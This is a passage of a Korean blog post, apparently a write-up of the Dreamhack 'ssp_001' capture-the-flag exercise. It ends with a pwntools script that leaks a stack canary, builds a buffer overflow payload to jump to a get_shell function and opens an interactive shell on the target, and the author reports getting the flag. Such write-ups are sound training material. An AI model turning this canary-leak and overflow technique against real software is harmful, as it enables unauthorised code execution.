    <span class="n">temp</span><span class="o">=</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">canary</span><span class="o">=</span> <span class="n">canary</span> <span class="o">+</span> <span class="n">temp</span>

<span class="c1"># converting canary from str to int -&gt; 32bit packed byte 
</span><span class="n">canary</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">canary</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">canary</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="n">hexdump</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span>

<span class="c1"># giving F option to do BOF exploitation and set the payload length
</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="s">"E"</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Name Size : "</span><span class="p">,</span> <span class="s">"300"</span><span class="p">)</span>

<span class="c1"># now constructing payload; 1) BOF 2) Canary 3) getting shell(NX bit enabled)
</span><span class="n">dump</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="mh">0x40</span>
<span class="n">canary</span>
<span class="n">dump2</span><span class="o">=</span><span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="mi">4</span>
<span class="n">ebp_dump</span><span class="o">=</span><span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="mi">4</span>
<span class="n">get_shell</span><span class="o">=</span><span class="n">p32</span><span class="p">(</span><span class="n">get_shell</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">dump</span><span class="o">+</span><span class="n">canary</span><span class="o">+</span><span class="n">dump2</span><span class="o">+</span><span class="n">ebp_dump</span><span class="o">+</span><span class="n">get_shell</span>

<span class="c1"># gdb.attach(p)
# raw_input("1")
</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Name : "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div> <p>그 결과, 플래그를 얻을 수 있었다. 플래그 인증샷은 스포가 되니 넣지 않을 것이다…</p> <br /><!-- Load Facebook SDK for JavaScript --> <div id="fb-root"></div> <script> (function(d, s, id) { var js, fjs = d.getElementsByTagName(s)[0]; if (d.getElementById(id)) return; js = d.createElement(s); js.id = id; js.src = "https://connect.facebook.net/en_US/sdk.js#xfbml=1&version=v3.0"; fjs.parentNode.insertBefore(js, fjs); })(document, "script", "facebook-jssdk"); </script> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8" ></script> <div class="share-page"> <p class="share-text">Share this on &rarr;</p> <a href="https://twitter.com/share?ref_src=twsrc%5Etfw" class="twitter-share-button" data-size="large" data-show-count="false" style="margin-top:5px;" >Tweet</a > <a class="fb-share-button" data-href="http://localhost:4000/blog/dreamhack_system_hacking/step6/ssp_001" data-size="large" data-layout="button" >Share</a> </div><!-- Author box --> <div class="card"> <div class="card-header"> About TouBVA </div> <div class="card-body"> <div class="row"> <div class="col-md-4"> <img class="author-profile-img" src="http://localhost:4000/assets/img/authors/toubva.jpeg" alt="TouBVA" /> </div> <div class="col-md-6"> <p class="author_bio">A Security Researcher, now concentrating on Security Consulting.</p> <p>Email : touBVa@gmail.com</p> <p>Website : https://toubva.github.io</p> <p class="profile-links"> <a class="social-link" href="https://github.com/TouBVa" target="_blank"><i class="fab fa-github fa-fw"></i></a> <a class="social-link" href="https://www.linkedin.com/in/johndoe" target="_blank"><i class="fab fa-linkedin fa-fw"></i></a> <a class="social-link" href="https://www.youtube.com/channel/UCSfLBFFfNU9r6ihfei6VeJw" target="_blank"><i class="fab fa-youtube fa-fw"></i></a> <a class="social-link" href="https://www.facebook.com/johndoe" target="_blank"><i class="fab fa-facebook fa-fw"></i></a> <a class="social-link" href="https://www.twitter.com/johndoe" target="_blank"><i class="fab fa-twitter fa-fw"></i></a> </p> </div> </div> </div> </div> </div><!-- Incomment incase you want to use Disqus <div id="disqus_thread"></div> --> </article> <div id="disqus_thread", style="width: 95%; margin-left: 3%;"><script> var disqus_config = function () { this.page.url = "http://localhost:4000/blog/dreamhack_system_hacking/step6/ssp_001"; /* Replace PAGE_URL with your page's canonical URL variable */ this.page.identifier = "/blog/dreamhack_system_hacking/step6/system-hacking-step-6-ssp_001"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */ }; (function () { /* DON'T EDIT BELOW THIS LINE */ var d = document, s = d.createElement('script'); s.src = 'https://toubva.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); </script> <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a> </noscript></div> </div> <div class="row"> <div class="col-md-4"> <div class="card"> <div class="card-header">About TouBVa</div> <div class="card-body"> <p class="author_bio">Welcome to my world!</p><!-- Place this tag where you want the github button to render. --> <a class="github-button" href="https://github.com/touBVa/touBVa.github.io" data-color-scheme="no-preference: dark; light: dark; dark: dark;" data-icon="octicon-star" data-size="large" data-show-count="true" aria-label="Star my blog on GitHub">Star</a> </div> </div> </div> <div class="col-md-4"> <div class="card"> <div class="card-header">Categories</div> <div class="card-body text-dark"> <div id="#dreamhack_system_hacking"></div> <li class="tag-head"> <a href="/blog/categories/dreamhack_system_hacking">dreamhack_system_hacking</a> </li> <a name="dreamhack_system_hacking"></a> <div id="#system_hacking"></div> <li class="tag-head"> <a href="/blog/categories/system_hacking">system_hacking</a> </li> <a name="system_hacking"></a> <div id="#protostar"></div> <li class="tag-head"> <a href="/blog/categories/protostar">protostar</a> </li> <a name="protostar"></a> <div id="#certification_study"></div> <li class="tag-head"> <a href="/blog/categories/certification_study">certification_study</a> </li> <a name="certification_study"></a> <div id="#paper_study"></div> <li class="tag-head"> <a href="/blog/categories/paper_study">paper_study</a> </li> <a name="paper_study"></a> <div id="#network_hacking"></div> <li class="tag-head"> <a href="/blog/categories/network_hacking">network_hacking</a> </li> <a name="network_hacking"></a> </div> </div> </div> <div class="col-md-4"> <div class="card"> <div class="card-header">Useful Links</div> <div class="card-body text-dark"> <li> <a href="http://localhost:4000/">Home</a> </li> <li> <a href="http://localhost:4000/about">About</a> </li> <li> <a href="http://localhost:4000/blog">Blog</a> </li> <li> <a href="http://localhost:4000/contact">Contact</a> </li> </div> </div> </div> </div> </div> </div> <div class="col-lg-12" id="newsletter_footer"><!-- Mailchimp Newletters --> <form action=""method="post" id="mc-embedded-subscribe-form" name="mc-embedded-subscribe-form" class="validate" target="_blank" novalidate> <div id="mc_embed_signup_scroll_footer"> <label for="mce-EMAIL_footer"> Signup for Weekly Email Newsletters :D</label> <input type="email" value="" name="EMAIL" class="email" id="mce-EMAIL_footer" placeholder="email address" required> <!-- real people should not fill this in and expect good things - do not remove this or risk form bot signups--> <div style="position: absolute; left: -5000px;" aria-hidden="true"> <input type="text" name="b_50bab1c85eae24ecfb0f68361_3a2dd721d0" tabindex="-1" value=""> </div><br /> <div class="clear"> <input type="submit" value="Subscribe" name="subscribe" id="mc-embedded-subscribe_footer" class="btn btn-lg btn-success"> </div> </div> </div><footer> <p> Powered by<a href="https://github.com/touBVa"> TouBVa</a>. Hosted at <a href="https://pages.github.com">Github</a>. Subscribe via <a href=" /feed.xml ">RSS</a> </p> </footer> <script> var options = { classname: 'progressline', id: 'my-id' }; var nanobar = new Nanobar( options ); nanobar.go( 30 ); nanobar.go( 76 ); nanobar.go(100); </script> <div hidden id="snipcart" data-api-key="Y2I1NTAyNWYtMTNkMy00ODg0LWE4NDItNTZhYzUxNzJkZTI5NjM3MDI4NTUzNzYyMjQ4NzU0"></div> <script src="https://cdn.snipcart.com/themes/v3.0.0-beta.3/default/snipcart.js" defer></script> <script src="http://localhost:4000/assets/js/mode-switcher.js"></script> <script> if (window.netlifyIdentity) { window.netlifyIdentity.on("init", user => { if (!user) { window.netlifyIdentity.on("login", () => { document.location.href = "/admin/"; }); } }); } </script> </body> </html>
